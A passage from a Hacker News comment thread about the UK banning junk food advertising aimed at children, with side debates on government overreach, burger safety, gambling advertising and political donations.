(confusion even), and I appreciate you bringing an authoritative reference to the discussion. reply JBits 16 hours agoparentprevI'm a bit confused as I thought muesli was healthy. reply kyriakos 16 hours agorootparentIt's healthy from the point of having fiber if you have no fruit and vegetables in your diet but at the same time it's 30% or more sugar. reply mentalgear 22 hours agoprevI hope other countries take action soon. It's deeply irresponsible how we allow advertisements and Big Sugar/Fast Food companies to exploit colorful cartoon characters and misleading health claims to hook people—especially children—on excessive sugar and fat consumption. This not only fosters unhealthy eating habits but also conditions them to crave specific branded flavors from an early age. reply whycome 21 hours agoparentAre adults not allowed to like colourful cartoon characters? Fruit flavours? reply daseiner1 21 hours agorootparentParent commenter didn’t write anything to the contrary; obviously the median child gets more excited by those two things than the median adult. I really loathe these sort of “gotcha” comments. reply whycome 19 hours agorootparent> Parent commenter didn’t write anything to the contrary; Did I imply that? Are \"colorful cartoon characters\" the part that's \"deeply irresponsible\" or just the misleading health claims? If you prevent the latter then you don't have anything to attach the former to. > I really loathe these sort of “gotcha” comments. I don't get what part of my comment was the 'gotcha' reply pixxel 10 hours agorootparent> I don't get what part of my comment was the 'gotcha Watching day-time cartoons will do that. reply akira2501 20 hours agorootparentprevYou're telling me this ad appeals to you in your demographic? https://www.youtube.com/watch?v=rJmM2CSn2ao reply whycome 20 hours agorootparentIsn’t the issue there the claims of “fruit flavours” easily misinterpreted as having actual fruit and including vitamin c prominently when it’s just fortified. reply meesles 20 hours agorootparentYou've moved the goalpost! No, the issue is that fruit flavors and cartoon characters are abused to appeal to children. That is what the original comment said and which you only half replied to! The video provided to you was an example of such - cartoons and 'fruit flavors' to hook kids on wanting sugary cereals for breakfast. reply whycome 19 hours agorootparentMoved goalpoast? > No, the issue is that fruit flavors and cartoon characters are abused to appeal to children. That is what the original comment said That's not what they said. They said: > It's deeply irresponsible how we allow advertisements and Big Sugar/Fast Food companies to exploit colorful cartoon characters and misleading health claims to hook people I don't think the cartoon characters is the part of the problem to address. And I think that aspect becomes irrelevant when addressing the actual problem. (And 'Fruit flavours' was my addition and question not theirs) What part of my comment \"only half replied\"? I asked two questions in relation to the comment. I mentioned \"colourful cartoon characters\" and \"fruit flavours\" because those are examples of things that \"appeal to kids\" even though they have wider audiences. Canada (and other countries?) want to ban flavours from e-cigarettes because of the appeal to youth (and limiting it to just mint, menthol and tobacco). Why should an adult be limited to mint as a flavour for an age-controlled product? Why shouldn't an advertiser be allowed to use colorful cartoon characters? Moved goalpost? Aren't we saying the same thing here? The video, and similar breakfast cereals, are perfect examples of the actual problem. It uses the combination of cartoons and false health claims. The false health claims are the parts that are problematic - that's the part to eliminate. The informational part of that video (and the box information design!) is meant to appeal to (read: mislead) adults, not kids. Allowing false health claims for unhealthy products is an issue. Miseducating parents and adults about what's healthy is an issue. Suppressing how terrible excess sugar is for children and adults is an issue. Allowing lines like \"how about fruit flavours\"? (in video) and showing pictures of fruit is an issue. Allowing producers to hide how unhealthy something is by saying it's \"healthy when part of a balanced breakfast\" is an issue. Even now, nutrition information or prominent labels for cereals can include the values (eg protein) when one consumes it with milk! Change that and what does that video or other ads for cereals become? reply akira2501 16 hours agorootparentThe purpose of the commercial is to create demand where there otherwise would not have been. Do you think that demand comes from the parents or the children? Which parts of the commercial do you think are most important for fomenting this demand? reply robertlagrant 2 hours agoprevGiven so many kids watch the state-funded CBeebies, which doesn't need ads, or YouTube or Netflix, which presumably this won't cover, this is probably just another chance for TV companies to stop broadcasting kids' content at all. reply hecticjeff 22 hours agoprevI don’t think this goes far enough. Kids see adverts for this stuff in so many other places, TV is just one small step. Take a kid into a supermarket and there’s junk food advertised everywhere. reply Dinux 22 hours agoparentIt's a first step. The larger point here is awareness. reply tonyedgecombe 5 hours agoparentprevWhen you think about it none of the ads are for healthy food. When did you ever see an advert for Broccoli on the television? Probably best to ban all food advertising. reply lijok 22 hours agoprevBaffling to me how advertising to those without a stable source of above living-cost income is allowed in the first place. Let alone advertising to children. reply zabzonk 21 hours agoparentHow do you select for \"those without a stable source of above living-cost income? reply kjkjadksj 50 minutes agorootparentSell your cereal to free school breakfast programs so those kids are literally spoon fed your stuff by the government. When they complain to their parents they want it at home, make sure you can trade food stamps for your cereal. reply lijok 21 hours agorootparentprevNo idea. That's for the advertising firms to figure out. reply chrisjj 21 hours agorootparentprevRation TVs, obviously :) reply Cthulhu_ 21 hours agoparentprevThey still get stuff though. Daytime advertising for toys is basically aimed at kids' birthday / christmas wishlists, pocket money, etc. If you add it up, that's hundreds of whatever your currency is per year across birthdays, gift giving holidays, and family / extended family. reply jasonlfunk 21 hours agoprevI just hope that the US can ban ads for pharmaceuticals. reply bdzr 3 hours agoparentWhy? reply dboreham 21 hours agoparentprevNever happen. There's a place called Canada though... reply nxm 6 hours agorootparentSame was said of tobacco... and I don't see any ads on TV for tobacco. reply dageshi 22 hours agoprevGood thing they made this move once daytime tv was basically irrelevant to anyone under 40 or it might've had some impact. reply gwerbret 22 hours agoparentDirect quote from the article which I'm sure you read: \"This government is taking action now to end the targeting of junk food ads at kids, across both TV and online.\" reply kjkjadksj 48 minutes agorootparentBecause when kids go on the internet they always end up in regulated age appropriate areas. reply phyzix5761 20 hours agoprevHelp me understand. The UK government basically said that parents are not responsible enough to make dietary decisions for their children so the government needs to step in and do it for them? Does that not seem like an overreach? Its not like 4 year olds are driving to McDonald's by themselves and ordering burgers. The parents are the ones being targeted here. reply majormajor 20 hours agoparentIt's more \"we don't want corporations selling unhealthy junk to have direct access to influence super-impressional kids\" - cause guess what, in that case? You can be a perfectly responsible parent dietary-decision-wise, but have your kids whine and complain constantly because the kids aren't informed about the problems of it and just want the tasty shit they saw all the ads for. Would you allow salespeople into your home to pitch your kids on stuff all day if they were in-person instead of on a screen? Why not complain about the overreach of irresponsible companies trying to convince kids who have no way of knowing better to start damaging their long-term health? reply phyzix5761 19 hours agorootparentAs a parent I don't let my children watch things I disagree with. They can probably count the number of food ads they've seen in 1 hand because I don't let them watch TV. They can watch shows and movies but they're either streamed or checked out of the library. But that's the way I choose to parent my child. If another parent wants their children to watch TV and be exposed to those ads then they should have every right. I'm not going to make a moral decision for them and I don't think the government should either. reply frereubu 19 hours agorootparentWhat about the (large, I would argue) slice of parents who want to let their kids watch TV but don't want them bombarded with ads for sugar-saturated foods? (I mean, we're on HN, so the obvious answer is watching things on a laptop / projector with Firefox + uBlock Origin, but y'know - everyone else). reply phyzix5761 17 hours agorootparentThose parents need to find solutions that don't involve forcing their morality on others. Thats how we get xenophobic and homophobic people voting to control women's bodies because they think others should do whatever they believe is moral and right. reply jraph 11 hours agorootparent> Those parents need to find solutions that don't involve forcing their morality on others I believe forbidding these ads is morally good, but it's not just morality. It's knowledge backed by studies: - children are easily influenced - burgers cause public health issues that harm the individuals, and cost greatly to the society in healthcare It's not a stance like \"I believe women should not abort because God\" (to take your example). It's a law aiming to reduce costs and and improve public health. This laws doesn't prevent parents from speaking about burgers to their children, and doesn't prevent TV from speaking about them neither. It's not a freedom of speech issue. There's an imbalance between the power of the big corporations and the power of the individuals and this law pushes the needle a bit towards the individuals. You the individual freedom defender should be happy with this :-) reply phyzix5761 11 hours agorootparentAlthough I never made an argument regarding free speech we can say that this does prevent free speech because it prevents companies from speaking about their products through advertisements. Remember that business owners are people too. Often times they're citizens of the countries in which they're doing business. I think most people tend to forget that and view companies as soulless abstract entities. In the US 99.9% (99.8% in the UK) of businesses are small businesses run by very few individuals who are just trying to make ends meet. If you remove the ability to advertise these products it doesn't hurt the big companies. They're established and have recognizable brands. But small businesses can't afford to lose their main way of finding customers. Eventually, they go out of business. This only helps the large corporations become even larger. > There's an imbalance between the power of the big corporations and the power of the individuals... Where is the imbalance of power in the scenario of burgers being advertised? All advertisement is designed to persuade the viewer to purchase the product or service. Marketing is a normal part of running a business. Children may be influenced by the commercials but so are adults. Should we ban all advertising now? > - burgers cause public health issues that harm the individuals, and cost greatly to the society in healthcare While burgers may not be the healthiest food, if you're a low income individual who can't access more expensive, healthier foods, burgers are nutrient and calorically rich and they're cheap. A burger to someone living below the poverty line without access to food is a life saver. Its all about context and perspective. reply pacoWebConsult 5 hours agorootparentprevCase in point for why socialized medicine leads to government overreach in many other facets of our lives. Milton Friedman had a great point during this talk [1], same argument from 50 years ago. 1: https://www.youtube.com/watch?v=oWIrbS0dXRM reply themk 15 hours agorootparentprevI'm the same. My children are practically never exposed to these ads. But, all their peers are. My kids have never had any fast food, and have never seen an ad, but they talk about KFC and McDonald's constantly. It all comes from their friends at school. reply jraph 20 hours agoparentprevChildren are totally targeted. They will ask their parents and put pressure to buy them stuff. Maybe even the parents who don't cave in can be relieved of this. In the longer term, stuff that enters your brain as a child shapes you and lasts long. See how well how many people in their 30s remember ads of their childhood. Why would someone defend such ads anyway? I don't believe they achieve anything good for anyone except the advertiser. reply phyzix5761 19 hours agorootparentIts because I don't want the government, people who I've never met in person and honestly are not the most moral of individuals, making moral decisions for my children on my behalf. Even if the majority of citizens agreed that forcing their morality on the minority is the right thing to do I still disagree because individual freedom is more important than majority opinion. reply jraph 12 hours agorootparent> Its because I don't want the government, people who I've never met in person and honestly are not the most moral of individuals, making moral decisions for my children on my behalf. But without the law, they are doing the moral decision of allowing the hurtful ads. There's no neutral state. The government has to pick a side anyway. So let's pick the side favorable to the citizens? > individual freedom is more important than majority opinion Isn't this a contradiction? If the majority wants something, you are hurting the individual freedom of the greatest number of people. reply phyzix5761 10 hours agorootparent> But without the law, they are doing the moral decision of allowing the hurtful ads. There's no neutral state. The government has to pick a side anyway. So let's pick the side favorable to the citizens? The idea of the government 'picking a side' is problematic because it assumes a one-size-fits-all solution that may not align with everyone's values. Allowing ads isn't endorsing them; it's respecting freedom of speech and trusting individuals to make their own choices. Once the government starts deciding which speech is acceptable, it opens the door for abuse and subjective enforcement, which can harm citizens more than it helps. The free market should decide whether they want to be exposed to ads or not by voting with their dollars. If an ad campaign doesn't produce the results a company wants they pull the ads and try something else. > Isn't this a contradiction? If the majority wants something, you are hurting the individual freedom of the greatest number of people. Individual freedom means the freedom to do, say, or think whatever you please as long as you don't harm another or their property. The will of the majority to force the minority to behave a certain way is not freedom. The majority is free to act however they want as long as it doesn't harm others but they shouldn't be allowed to force others to behave a certain way. Majority opinion can lead to tyranny if it infringes on the rights of individuals. History offers countless examples of majorities oppressing minorities. The role of a just society is to protect each person's right to life, liberty, and property, even when the majority disagrees. The focus should be on safeguarding universal rights rather than catering to the fluctuating preferences of a majority. reply bdzr 3 hours agorootparentprevDon't forget that this emboldens the government to define what is and isn't healthy. Something that's worked out super well in the US. reply alex_lav 1 hour agorootparentprevShame I had to scroll this far to get to this comment. I have absolutely no idea why, in 2024, people still think we should let the government decide what is good/what we can see/what others can say. reply MiguelX413 19 hours agorootparentprevWhat's the point of laws if not forcing morality? reply phyzix5761 17 hours agorootparentProtecting individual rights and freedoms reply jraph 12 hours agorootparentNot at the cost of harming people, usually. Its role is also to protect individuals themselves. Infinite individual freedom doesn't exist, it stops where others' individual freedom starts. reply alex_lav 1 hour agorootparent> Not at the cost of harming people, What defines harm? Or more specifically, who? reply phyzix5761 10 hours agorootparentprevAbsolutely. Individuals should have rights and freedoms as long as they don't harm another's. reply dijksterhuis 18 hours agorootparentprev> I still disagree because individual freedom is more important than majority opinion. this read suspiciously like a stereotypical US opinion regarding individual rights vs rights of the majority. so i went and looked through your comment history and i now i suspect even more strongly that you are US based. > Its because I don't want the government, people who I've never met in person and honestly are not the most moral of individuals, making moral decisions for my children on my behalf. it’s not your government doing this. you can relax. also, we in the UK value the balance between individual rights and collective societal rights more strongly than you do. it’s our thing. if you don’t like it, it doesnt matter, you don’t live here. reply devinrf 1 hour agorootparent> \"we in the UK value the balance between individual rights and collective societal rights more strongly than you do\" isn't this also the place where you can go to jail for what you say online? orwell's probably rolling in his grave somewhere in London reply robertlagrant 3 hours agorootparentprev> this read suspiciously like a stereotypical US opinion regarding individual rights vs rights of the majority. Good. Majorities shouldn't be able to steamroller minorities. reply phyzix5761 17 hours agorootparentprevJust because someone doesn't live in a particular region doesn't mean they can't have opinions on broader implications of these reforms. reply dijksterhuis 3 hours agorootparentsure, except there are no broader implications for you right now. worry about that when it comes around pal. you’re just wasting energy right now spreading FUD. what im basically saying here is, yes, you’re entitled to have an opinion. but i’m also entitled to have an opinion that your opinion is meaningless and irrelevant to the subject at hand. which is what i am expressing. reply tonyedgecombe 5 hours agoparentprev>The UK government basically said that parents are not responsible enough to make dietary decisions for their children so the government needs to step in and do it for them? Stand outside any school gate in the UK and you will see that the majority of parents \"aren't responsible enough to make dietary decisions for their children\". I'm fairly relaxed about it simply because this is a response to the behaviour of these corporations. reply Argonaut998 20 hours agoparentprevThe UK is so far gone with government overreach at this point. They don’t seem to mind. reply forinti 20 hours agoparentprevThey're not prohibiting anyone from feeding these things to their children. A lot of people will continue to do so. The government would have to spend a lot of money on counter-campaigns to keep the public well informed and it probably wouldn't have the desired effect on children. Finally, and this is a very important point for me, children cannot enter into business deals/contracts; commercials are business proposals; hence there should be no ads targeting children. reply dcre 20 hours agoparentprevThey should keep reaching and ban the rest of the ads. reply snovymgodym 19 hours agoparentprevThat's a great way to frame the whole thing if you're a corporation trying to sell junk food I guess. In reality, this law is only about advertising, specifically about making it slightly harder to target children with advertising for junk food in a country that already has a serious problem with obesity. reply widdershins 20 hours agoparentprevI'm not sure what you're getting at. They banned certain advertisments at a particular time of day. They didn't ban parents from giving their children whatever thet want to give them. reply mirsadm 20 hours agoparentprevDo you have children? They're targeted with ads everywhere. You can be a responsible parent but these things cause unnecessary stress. Quite frankly if the government wants to ban all advertising I would be thrilled. reply phyzix5761 19 hours agorootparentI do have children and I don't let them be exposed to things I disagree with. But thats my moral decision. Why should my morality be forced on others? Making the decision to not expose your children to certain ads is a moral decision. Let the parents choose if its important for them. They can choose exactly what kind of content their children watch with streaming and DVDs. Long gone are the days where kids just sat in front a television and had to watch live cable TV where the parents didn't know what was coming up next. reply duckmysick 18 hours agorootparentYou, as an individual, can still play the adverts to your children. The regulation is targeting the advertisers. reply rsynnott 5 hours agoparentprev... No, that's not what it says at all. The level of reading comprehension on this website really is astonishingly low. It's about restrictions on advertising, not bans on products. reply narrator 20 hours agoprevIs there a name for an ideology that says all social and economic problems can be solved through mass psychology? You could call it psychohistory perhaps, but there's got to be a newer term. Seems like it's the dominant ideology of a variety of technocrats. Yes there are psychological aspects to governance but more and more it's becoming the only solution to all problems. Obesity is skyrocketing? It's the psychology. People don't like unlimited immigration? Get out the mass psychology. People perceive that inflation is out of control. Get out the mass psychology. Market is down. Employ mass psychology. People don't give a crap about a war that they have no stake in. Mass psychology. I guess propaganda works and it's very cheap, lol. reply pandoro 19 hours agoparentOn this subject I highly recommend the documentary \"the Century of the Self\" (produced by Adam Curtis for the BBC). It explores how Sigmund Freud's theories about the unconscious mind were used by his nephew Edward Bernays to create modern public relations and consumer culture. The documentary shows how corporations and governments learned to manipulate mass desires using psychological techniques, transforming democracy from meeting people's needs to managing their wants through consumption and marketing. The entire doc is on Youtube: https://youtu.be/GFwDc17WZ-A reply ajb 19 hours agoparentprevThe recent fashionable term is \"nudge theory\" reply switch007 19 hours agorootparentSee also https://en.m.wikipedia.org/wiki/Behavioural_Insights_Team as an implementation reply mym1990 19 hours agoparentprevPsychohistory is already a study of the past and why it happened the way it did, so maybe it could help answer your question, but it isn’t the ideology you’re seeking. There is a reason that advertising and media influence is everywhere, it is a cheap and has a decent return on investment, whether that is actual revenue or just a shift in people’s perspective. reply rsynnott 5 hours agoparentprev... I mean, in this case, it's a problem being _caused_ by mass psychology (that's what advertising is). reply nonrandomstring 19 hours agoparentprevPublic Relations - Edward Bernays [0] Propaganda - Edward Bernays in 1928 [1] Public opinion - Walter Lippmann 1947 [2] [0] https://en.wikipedia.org/wiki/Public_Relations_(book) [1] https://en.wikipedia.org/wiki/Propaganda_(book) [2] https://en.wikipedia.org/wiki/Public_Opinion_(book) reply ausbah 19 hours agoparentprevsomething involving ppl following whatever the political or media firestorm of the moment is, and most ppl more likely to just follow whatever the party line is? reply Angostura 19 hours agoparentprevYou may be thinking of Nudge Theory reply Waterluvian 19 hours agoparentprevI think it’s traditionally called advertising. reply tim333 6 hours agoprevGlad they got that through - the argument's been going on for ages. Here's a 2006 \"Total ban for junk food ads around kids' shows\" article https://www.theguardian.com/society/2006/nov/17/health.food But I don't think they did sugary breakfast cereals because Kelloggs et al made a fuss. reply jamesu 19 hours agoprevOne thing I noticed is during UK Daytime TV is there are a comical amount of funeral and life insurance ads, it's incredibly depressing. reply eterm 19 hours agoparentThat's the demographics of who watches daytime TV. Also note that advertising of prescription pharmaceuticals is already banned, which would likely be another large advertiser were that not the case. reply tonyedgecombe 5 hours agoparentprevPlus adverts for stair lifts and laxatives showing the healthiest looking old people you have ever seen. reply ch0wn 19 hours agoprevA good move but it's still mad to me that we're banning junk food ads while fossil fuel ads are still allowed which are creating damage many orders of magnitudes greater than a muffin ever could. reply dnissley 3 hours agoparentWhat is a fossil fuel ad? I don't think I've ever seen an ad for e.g. a gas station. Car ads maybe? reply aembleton 9 hours agoparentprevFossil fuels are being tackled by phasing out new ICE car sales by 2035. 22% of new cars this year have to be zero emissions (EVs). reply Funes- 18 hours agoprevWhat about no ads, at all? Have you ever thought of that? Just stop and consider the ramifications of such a ban. Most junk on TV and the Internet would not exist once people were forced to pay directly for consuming (eugh) it. YouTube would go back to what it was almost twenty years ago, for one. Imagine a Google with no ad-ridden, SEO-tweaked, LLM-generated sites in the results, not a single mainstream media outlet to be seen... one can only dream. Now, for junk food (the actual subject of this thread), I wager its sales would be severely diminished, or heavily diversified between other, less successful brands, at least. reply cryptozeus 21 hours agoprevGood that they are trying but “ …aired after the 9:00 pm” running ads after 9 pm is even worst. If you need to consume sugar you might as well do it in day time. reply wrboyce 19 hours agoparentA lot of the regulations around what is and isn’t allowed on TV in the UK change at 2100, we call it the “watershed” which is regulated by OfCom (the communications ombudsman). https://www.ofcom.org.uk/tv-radio-and-on-demand/broadcast-st... reply xxs 21 hours agoparentprevIt's about kids, ads targeted at kids (according to the article) reply contingencies 20 hours agoprevThe significant background that the UK just delivered a House of Lords enquiry in to the food system[0] which recommended a \"complete ban\" on junk food advertising and that the government ban junk food vendors from regulatory feedback. You can bet the consumer packaged goods (CPG) AKA 'junk food industry' - the likes of Mondelez, etc. - are actively resisting these changes with all manner of false reports, shoddy advertising doublespeak and back-channel arrangements. Given this background, the ban is relatively light touch. Expect further developments. [0] https://publications.parliament.uk/pa/ld5901/ldselect/ldmfdo... reply democritas 19 hours agoprevwish we wouldn't keep demonizing fat though, if you decrease one form of energy intake (sugar) you have to increase another form of energy intake, no problem with this being fat, as long as it's naturally occurring in the environment and thus among our adaptations. reply aembleton 9 hours agoparent> if you decrease one form of energy intake (sugar) you have to increase another form of energy intake We have an obesity problem in the UK. We need to reduce overall calorific intake. reply tomp 22 hours agoprevWow, what's wrong with burgers? I mean, certainly you can get bad meat, and maybe it's easier to conceal in a burger than in a steak, but ... how about literally all other processed meat that is invariably processed more than burgers? Salami, sausages, hot dogs, ... I personally love burger, and consider it one of the finest foods. Fortunately, there's a very easy way to know the quality of a burger - if they ask you, how well you want it done, it's high quality! Shitty burger places like McDonalds and Burger King don't want to risk selling you a medium-done burger... Funny enough, UK is one of the better places for high-quality burger, much better than e.g. Switzerland or Slovenia! My favourite in London is (was? 2019) Honest Burger... reply Karellen 22 hours agoparent> Also on the banned list are products such as chickpea or lentil-based crisps, seaweed-based snacks and Bombay mix as well as energy drinks, hamburgers and chicken nuggets. The foods mentioned in the article are not an exhaustive list of all the foods for which the government has banned advertising. It's possible they've also banned ads for salami, sausages and hot dogs, but the article didn't mention it. Probably because, compared to burgers, there aren't that many ads for salami, sausages and hot-dogs during daytime TV, so it's not seen as much of a problem, or as worth mentioning. But because you mention it - how many daytime ads do you see for high quality burgers, like Honest Burger, as compared to ads for McDonalds and Burger King? reply cma 18 hours agorootparentMcDonald's burgers are 100% beef. What's the problem? If the bun and other parts of the burger are ultra processed, whatever that means, well, that's the same for their chicken sandwiches, right? If the problem is the salt or seasonings, why not ban ads for salty burgers over a threshold or burgers with the specific problematic seasonings? reply nradov 17 hours agorootparentSalt is not particularly a problem unless someone has a genetic predisposition to hypertension or doesn't drink enough water. reply KaiserPro 21 hours agoparentprevThere is nothing wrong with most foods as part of a mixed diet. The problem is, a burger/box of chicken is ~£2-4 and fucking fast. A meal with vegetables either takes preparation, or is >£6 The issue here is that the UK is obese as fuck. Partly because of education, partly because of price, party because of supermarkets. If we want to avoid spending billions upon billions tackling diabetes and other related conditions, the UK needs to tackle its diet. This is reply Krutonium 21 hours agoparentprevIn Canada, it's outright illegal to sell a burger medium done. If you get caught, your restaurant will be closed for a couple weeks minimum, along with a hefty fine. It must be fully cooked, or not served. reply akira2501 20 hours agorootparentIt's ground beef. The rule is you must cook it to the proper internal temperature. This is reasonable food safety. This simply precludes medium as an option. If they grind their own meat or use something like ground chuck or ground round you can get it medium. reply cma 18 hours agorootparentWhy is ground chuck safer than other ground beef? reply evgen 4 hours agorootparentBacteria contaminates the exposed surface of foods. Pre-ground meat has a _lot_ of surface area exposed so the potential for contamination is high. If you get your meat as a chunk of chuck roast or larger primal cut, follow good food safety practices in how you maintain your workspace, and then grind the chuck and turn it into patties to be grilled the probability for serving a contaminated product is low. The problem is that this is more expensive and time consuming so almost no one actually does this in a commercial setting. If you tell me you do this when I come over to your home cook-out I will possibly trust you to serve me a burger with some pink in it, but if your restaurant tries to sell a $6 burger that you let someone order medium-rare bad things are going to eventually happen... reply BenjiWiebe 2 hours agorootparentFor added safety, you can even sear the outside of the cut, then trim the seared part before grinding the rest. reply dboreham 21 hours agorootparentprevSame in UK. Family members keep asking me when we travel there \"will my burger be done right\". Uhhh..there's only one kind of doneness for a burger in these parts. reply tomp 20 hours agorootparentprevThat doesn’t make sense. It’s beef. If you can serve a steak medium, then you can also grind the steak, cook it medium and serve it. reply ilyin 10 hours agorootparentA whole steak doesn't contain pathogens deep within, only on the surface, which is why ground beef is different situation entirely. reply cma 18 hours agorootparentprevThen you get bacteria in the ground part, potentially, whereas a steak will be cooked on all the exposed surfaces. reply tomp 18 hours agorootparentUm, it’s beef. It can be eaten raw. Ever heard of carpaccio?!? Only two reasons to ever cook beef: (1) taste (2) quality reply BenjiWiebe 2 hours agorootparentThe exterior of a cut can be seared and then trimmed off to get a safe chunk of raw beef. reply dylan604 21 hours agorootparentprevseriously? No medium well, just straight up well done? So, hockey pucks? Ahh, now it makes sense. It's a law endowed by Canada's love of hockey reply dboreham 21 hours agorootparentIt's perfectly possible to cook a burger such that it's not dry but also not raw. reply pshc 20 hours agoparentprevThe burgers they show on TV are pure junk food, let's be real. reply EasyMark 17 hours agoparentprevHamburgers on whole wheat are a staple in my life. The war on saturated fat and red meat is ridiculous reply zabzonk 21 hours agoprevI hear crumpets are also frowned on - my favourite breakfast food! reply jackjeff 22 hours agoprevIf only I ever watched ads on live TV I would have noticed… reply steviedotboston 21 hours agoprevwhat about sausage rolls and meal deals? reply ojagodzinski 22 hours agoprevcool but nobody watches TV this days. reply anticorporate 21 hours agoparentI mean, that's objectively disproved by the advertising industry who is profiting from these ads. Maybe you and I aren't, but lots of people are. reply jsheard 22 hours agoprevCan we do gambling ads next? We banned tobacco ads and then seemingly forgot the lesson that it's actually bad to let advertisers shove addictive and self-destructive products in the publics face, including to former addicts at risk of relapse. reply ashconnor 21 hours agoparentConsidering Labour's connection to gambling companies [0] probably not. [0] https://www.theguardian.com/society/article/2024/jun/28/tory... reply hermitcrab 20 hours agorootparentIndeed. It has been heavily covered in Private Eye, as well. Labour is deeply in hock to the gambling industry. So much for \"gambling is the curse of the working class\". reply Der_Einzige 6 hours agorootparentI’d vote lib dem in every election to get British paternalism out of your politics, luckily my country voted with guns to refuse to recognize the authority of your tyrannical monarchy The lib dems are the only party in the UN that cares about personal freedom, and yall don’t like them. Y’all also didn’t like labor when it was actually living up to its name (Corbyn years). Get off your high horse you authoritarian despots and let the poor have their gambling. reply hermitcrab 4 hours agorootparent>luckily my country voted with guns to refuse to recognize the authority of your tyrannical monarchy And how is that going? reply Der_Einzige 1 hour agorootparentUSD is making every other country look and feel poor with how strong it is right now, vs… brexit, so it’s going great! The UK is the sick man of Europe. reply fakedang 20 hours agorootparentprevFunny how you can buy British politicians for dirt cheap. In India or the US, it would take at least $100k-200k to get a single politician's attention at the bare minimum, while in the UK you can influence party positions for 25k quid. reply saagarjha 20 hours agorootparentI don't have enough experience about India to comment on that but in the US the amount of money it takes to influence a politician is quite low. reply WillPostForFood 19 hours agorootparentHow much do you estimate it would take to get a politician to flip their view on abortion, gun control, illegal immigration, health care? Seems like if it were \"quite low\" you'd see politicians flipping views all the time as one side or the other channelled money to them. What we actually see is a lot of stasis, refusal to compromise, and politicians locked in with their party, which suggests it is pretty hard to influence politicians. Where money is effective is using it to get politicians who agree with your view elected. reply arp242 16 hours agorootparent\"Buying a politician to vote in a certain way\" is not really how it works most of the time. It's more \"buying time with a politician so you can give the best possible explanation for your case without any counter-argument\". Turns out, that is surprisingly effective, especially when there isn't really an organised counter-movement with similar funds to get politicians ears. reply addicted 9 hours agorootparentprevYou don’t buy politicians to change their views on the circus items. The only reason all those “issues” are issues is because they’re intended to distract the public from the actual stuff politicians are being bought for. Transferring wealth to their buyers. 80% of the politicians on both sides of the spectrum have the same beliefs about all those issues. reply devilbunny 17 hours agorootparentprevThose are all hot-button issues that can make someone lose their seat. Unless you have enough money that they never have to work again, not going to happen. Almost nobody outside of HN notices the DMCA, but it’s there. reply fakedang 19 hours agorootparentprevDon't you need to donate at least $100k to influence senators or influence party positions in the US? Sure, you could \"buy\" a politician for cheaper, but you're not guaranteeing they will toe your line. India is ridiculously expensive - bribes often amount to 50 lakh rupees to 1 crore + rupees, which amounts to roughly $50k-100k per politician. Not to mention bribery at the lower rungs of the ladder where everyone from the politician's toilet janitor all the way to the politician's chief of staff will demand their pound of flesh, usually in the tune of tens of lakhs of rupees (~$10k). reply thanksgiving 19 hours agorootparentThat's not a good thing. From what I understand, a lot of \"cheaper\" bribes in India are for things that the government employees must do as a part of their jobs so like a bribe for these government employees to do their job basically which still filters up to the highest levels of government. Why would you agree to stick your neck out for something illegal on the cheap when you can wring the ordinary people to do your job? All this is based on second hand information so please correct me where I am wrong. Also probably things are different in different parts of the country? reply SanjayMehta 18 hours agorootparentThis is exactly how it works. reply fakedang 10 hours agorootparentprevI'm not saying it's a good or a bad thing - bribery is bad, full stop. I wanted to draw a comparison between how expensive it is in India vs the UK, which means that a relatively smaller pool of individuals can actually afford to bribe in India vs the UK, which makes projects more concentrated in the hands of a few (which is still a lot in a bit country like India). On the other hand, I was a member of the Treasury group and the Leaders group of the Tory party until recently, with just a \"paltry\" donation of £50k, which got me the ear of a sitting PM and regular meetings with the Chancellor. Good luck trying to get that kind of access in India or the US with the PM. The cheaper bribes were a tangent, but just to show that doing business in India is actually more expensive than in the UK (where there are no such bribes). reply throwaway2037 19 hours agorootparentprevThis is an interesting observation. Why do you think it is so much lower in UK Vs US? My guess: There are much less private donations in the national UK political system. reply kd5bjo 18 hours agorootparentUS congressional districts being an order of magnitude larger than UK constituencies probably has something to do with it. Also, there are significantly more MPs than representatives, so you have to swing more legislators to your side in the UK vs the US to get your pet policies adopted. (Sources: https://en.wikipedia.org/wiki/United_States_congressional_ap... , https://en.wikipedia.org/wiki/Constituencies_of_the_Parliame... ) reply fakedang 10 hours agorootparentBut you can get a seat at the table for negotiations if the Tories are in power and you're a part of the Leaders group or the Treasury group of donors. All for £50k. Leaders group puts you in touch with the Tory party leader (who is often the PM if the Tories are in power). Treasury group invites you to meetings with the Chancellor of the Exchequer. reply SanjayMehta 18 hours agorootparentprevIn India one doesn’t just bribe a politician, one hires an expensive lawyer who “handles” the case. The real bribery starts at the bottom of the pyramid. Say you want a water connection. The rate is set on the size of the property, and each layer in the pyramid knows exactly how many square feet were approved and what their individual percentage will be. And again, you can’t just bribe the fellow directly: you need to go through a trusted agent who acts as a cut-out between the briber and the bribed. This started after the Lok Ayukta started conducting raids. Who says our babus aren’t flexible and innovative? reply willcipriano 18 hours agorootparentprevUS politians are routinely bought for numbers similar to the UK ones. They will often vote in a way that their constituents do not want for ~10k in campaign contributions. They didn't have to worry about the voters finding out about it (this is changing with alternative media) beacuse the same people bought ads on the major networks. reply Der_Einzige 6 hours agorootparentprevSK presidents wife cost one Dior bag worth 2200$ USD. Not even Gucci, Chanel, or Louis Vuitton! reply LeoPanthera 21 hours agoparentprevIt's interesting that the UK has banned gambling ads online, but not on TV. Combined with the fact that they regulate cryptocurrencies as gambling, that's why you get no UK crypto ads online. For example, the PayPal UK front page doesn't even mention that you can buy crypto there. reply rgblambda 20 hours agorootparentMaybe this is blurring the line between online and TV, but TV streaming services definitely have gambling ads. A gambling ad literally just came on the Channel 4 player in front of me as I started typing this. reply zakki 21 hours agorootparentprevDo you have the link that regulate crypto as gambling in UK? I tried Google it but no luck. reply frereubu 19 hours agorootparentThis isn't true. OP may be confusing things like this - https://www.gamblingcommission.gov.uk/licensees-and-business... - as saying that crypto is regulated as gambling, but it's not. reply exe34 20 hours agorootparentprevwait if crypto is gambling, then they don't tax the proceeds, right? but I'm pretty sure they tax it as capital gains..... so it's gambling for advertising purposes but capital investment for tax purposes... I suppose the law is an ass. reply thenickdude 19 hours agorootparentprevYou can buy crypto on PayPal?? Our New Zealand version doesn't mention it either. reply LeoPanthera 18 hours agorootparentNot in New Zealand. The USA, the UK, and Luxembourg only. reply manojlds 22 hours agoparentprevIt's interesting that one of the tax free investment/savings choices in the UK is basically a lottery. reply derriz 21 hours agorootparentI'm pretty sure all gambling winnings are tax free in the UK? Thank the power of the horse racing/gaming/gambling lobby. Many years ago when I lived there, I had an IG Index account - who market themselves 